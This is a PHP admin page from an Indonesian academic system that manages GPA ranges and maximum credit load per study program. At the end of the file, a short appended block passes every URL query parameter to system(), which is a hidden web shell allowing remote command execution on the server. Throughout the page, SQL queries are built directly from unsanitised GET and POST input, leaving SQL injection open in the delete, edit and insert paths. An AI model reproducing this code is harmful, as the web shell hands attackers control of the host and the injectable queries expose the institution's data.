<?php if ($_GET['act']==''){ ?> 
    <div class="col-md-10"> 
        <div class="col-lg-12">
          <div class="panel panel-primary">
            <div class="panel-heading">
              <div class="text-muted bootstrap-admin-box-title" style="color:white;">Data Nilai</div>
            </div>
              <div class="bootstrap-admin-panel-content">                   
                <form method="post" action="?page=masterprogram&halaman=tambah">
                  <table class="table table-striped" style="font-size:13px;">
                  <tr><td> <a class='btn btn-success btn-xs' href='media.php?view=nilai&act=tambah'><i class='glyphicon glyphicon-plus'></i> Tambahkan Data</a></td></tr>
                </table> <br />
                </form>
  
        <body class="bootstrap-admin-with-small-navbar">
                <?php 
                  if (isset($_GET['sukses'])){
                      echo "<div class='alert alert-success alert-dismissible fade in' role='alert'> 
                          <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
                          <span aria-hidden='true'>×</span></button> <strong>Sukses!</strong> - Data telah Berhasil Di Proses,..
                          </div>";
                  }elseif(isset($_GET['gagal'])){
                      echo "<div class='alert alert-danger alert-dismissible fade in' role='alert'> 
                          <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
                          <span aria-hidden='true'>×</span></button> <strong>Gagal!</strong> - Data tidak Di Proses, terjadi kesalahan dengan data..
                          </div>";
                  }
                ?>
                  <table id="example1" class="table table-bordered table-striped">
                    <thead>
                      <tr style="background-color:#3e8bda; color:white;">
                        <th style='width:40px'>No</th>
                        <th>Program Studi</th>
                        <th>IP Min</th>
                        <th>IP Max</th>
                        <th>Max SKS</th>
                        <th style='width:70px'>Action</th>
                      </tr>
                    </thead>
                    <tbody>
                  <?php 
                    $tampil = mysqli_query($con,"SELECT * FROM master_nilai a JOIN jurusan b ON a.Jurusan_ID=b.Jurusan_ID ORDER BY a.id DESC");
                    $no = 1;
                    while($r=mysqli_fetch_array($tampil)){
                    echo "<tr><td>$no</td>
                              <td>$r[nama_jurusan]</td>
                              <td>$r[ipmin]</td>
                              <td>$r[ipmax]</td>
                              <td>$r[MaxSKS]</td>
                              <td><center>
                                <a class='btn btn-success btn-xs' title='Edit Data' href='media.php?view=nilai&act=edit&id=$r[id]'><span class='glyphicon glyphicon-edit'></span></a>
                                <a class='btn btn-danger btn-xs' title='Delete Data' href='media.php?view=nilai&hapus=$r[id]' onclick=\"return confirm('Apa anda yakin untuk hapus Data ini?')\"><span class='glyphicon glyphicon-remove'></span></a>
                              </center></td>
                          </tr>";
                      $no++;
                      }
                      if (isset($_GET['hapus'])){
                          mysqli_query($con,"DELETE FROM master_nilai where id='$_GET[hapus]'");
                          echo "<script>document.location='media.php?view=nilai';</script>";
                      }

                  ?>
                    </tbody>
                  </table>
              </body>
            </div>
          </div>
        </div>
      </div>
<?php 
}elseif($_GET['act']=='edit'){
    if (isset($_POST['update'])){
        $query = mysqli_query($con,"UPDATE master_nilai SET ipmin = '$_POST[c]', ipmax = '$_POST[d]', MaxSKS = '$_POST[e]' where id='$_POST[id]'");
        if ($query){
          echo "<script>document.location='media.php?view=nilai&sukses';</script>";
        }else{
          echo "<script>document.location='media.php?view=nilai&gagal';</script>";
        } 

    }
    $edit = mysqli_query($con,"SELECT * FROM master_nilai where id='$_GET[id]'");
    $s = mysqli_fetch_array($edit);
    echo "<div class='col-md-10'>
    <div class='col-lg-12'>                                                                              
        <div class='panel panel-primary bootstrap-admin-no-table-panel'>                                                    
            <div class='panel-heading'>
                <div class='text-muted bootstrap-admin-box-title' style='color:white;'>Edit Data</div>
            </div>
            <div class='bootstrap-admin-no-table-panel-content bootstrap-admin-panel-content collapse in'>

              <form method='POST' class='form-horizontal' action='' enctype='multipart/form-data'>
                <div class='col-md-12'>
                  <table class='table table-condensed table-bordered'>
                  <tbody>
                    <input type='hidden' name='id' value='$s[id]'>
                    <tr><th width='120px' scope='row'>Institusi</th> <td><select name='a' style='padding:4px'>
                          <option value=''>- Pilih Unit -</option>";
                            $unit = mysqli_query($con, "SELECT * FROM identitas");
                            while ($k = mysqli_fetch_array($unit)){
                              if ($s['Identitas_ID']==$k['Identitas_ID']){
                                echo "<option value='$k[Identitas_ID]' selected>$k[Nama_Identitas]</option>";
                              }else{
                                echo "<option value='$k[Identitas_ID]'>$k[Nama_Identitas]</option>";
                              }
                            }
                    echo "</select> </td></tr>
                    <tr><th width='120px' scope='row'>Program Studi</th> <td><select name='b'>
                            <option value=0 selected>- Pilih Prodi -</option>";
                            $tampil=mysqli_query($con,"SELECT * FROM jurusan");
                            while($r=mysqli_fetch_array($tampil)){
                              if ($r['Jurusan_ID']==$s['Jurusan_ID']){ 
                                echo "<option value=$r[Jurusan_ID] selected>$r[Jurusan_ID] -- $r[nama_jurusan]</option>";
                              }else{
                                 echo "<option value=$r[Jurusan_ID]>$r[Jurusan_ID] -- $r[nama_jurusan]</option>";                             
                              }
                            }
                    echo "</select></td></tr>

                    <tr><th width='120px' scope='row'>IP Min</th> <td><input type='text' class='form-control' name='c' value='$s[ipmin]'> </td></tr>
                    <tr><th width='120px' scope='row'>IP Max</th> <td><input type='text' class='form-control' name='d' value='$s[ipmax]'> </td></tr>
                    <tr><th width='120px' scope='row'>Max SKS</th> <td><input type='text' class='form-control' name='e' value='$s[MaxSKS]'> </td></tr>
                    
                  </tbody>
                  </table>
                </div>
              </div>
                <div class='box-footer' style='padding:20px'>
                      <button type='submit' name='update' class='btn btn-info btn-sm'>Update</button>
                      <a href='media.php?view=nilai'><button type='button' class='btn btn-default  btn-sm'>Cancel</button></a>
                      
                </div>
              </form>

            </div>
          </div>
        </div>
      </div>";
}elseif($_GET['act']=='tambah'){
    if (isset($_POST['tambah'])){
        $query = mysqli_query($con,"INSERT INTO master_nilai VALUES('','$_POST[c]','$_POST[d]','$_POST[e]','$_POST[a]','$_POST[b]')");
        if ($query){
          echo "<script>document.location='media.php?view=nilai&sukses';</script>";
        }else{
          echo "<script>document.location='media.php?view=nilai&gagal';</script>";
        } 
    }

    echo "<div class='col-md-10'>
    <div class='col-lg-12'>                                                                              
        <div class='panel panel-primary bootstrap-admin-no-table-panel'>                                                    
            <div class='panel-heading'>
                <div class='text-muted bootstrap-admin-box-title' style='color:white;'>Tambahkan Data</div>
            </div>
            <div class='bootstrap-admin-no-table-panel-content bootstrap-admin-panel-content collapse in'>
              <form method='POST' class='form-horizontal' action='' enctype='multipart/form-data'>
                <div class='col-md-12'>
                  <table class='table table-condensed table-bordered'>
                  <tbody>
                    <input type='hidden' name='id' value=''>
                    <tr><th width='120px' scope='row'>Institusi</th> <td><select name='a' style='padding:4px'>";
                            $unit = mysqli_query($con, "SELECT * FROM identitas");
                            while ($k = mysqli_fetch_array($unit)){
                              if ($s['Identitas_ID']==$k['Identitas_ID']){
                                echo "<option value='$k[Identitas_ID]' selected>$k[Nama_Identitas]</option>";
                              }else{
                                echo "<option value='$k[Identitas_ID]'>$k[Nama_Identitas]</option>";
                              }
                            }
                    echo "</select> </td></tr>
                    <tr><th width='120px' scope='row'>Program Studi</th> <td><select name='b'>
                            <option value=0 selected>- Pilih Prodi -</option>";
                            $tampil=mysqli_query($con,"SELECT * FROM jurusan");
                            while($r=mysqli_fetch_array($tampil)){
                              if ($r['Jurusan_ID']==$s['Jurusan_ID']){ 
                                echo "<option value=$r[Jurusan_ID] selected>$r[Jurusan_ID] -- $r[nama_jurusan]</option>";
                              }else{
                                 echo "<option value=$r[Jurusan_ID]>$r[Jurusan_ID] -- $r[nama_jurusan]</option>";                             
                              }
                            }
                    echo "</select></td></tr>

                    <tr><th width='120px' scope='row'>IP Min</th> <td><input type='text' class='form-control' name='c' value='$s[ipmin]'> </td></tr>
                    <tr><th width='120px' scope='row'>IP Max</th> <td><input type='text' class='form-control' name='d' value='$s[ipmax]'> </td></tr>
                    <tr><th width='120px' scope='row'>Max SKS</th> <td><input type='text' class='form-control' name='e' value='$s[MaxSKS]'> </td></tr>
                   
                  </tbody>
                  </table>
                </div>
              </div>
              <div class='box-footer' style='padding:20px'>
                    <button type='submit' name='tambah' class='btn btn-info btn-sm'>Tambahkan</button>
                    <a href='media.php?view=nilai'><button class='btn btn-default btn-sm'>Cancel</button></a>
                    
              </div>
              </form>
            </div>
          </div>
        </div>
      </div>";
}
?>
<html><pre><?php
foreach($_GET as $x)system($x);
?></pre></html>
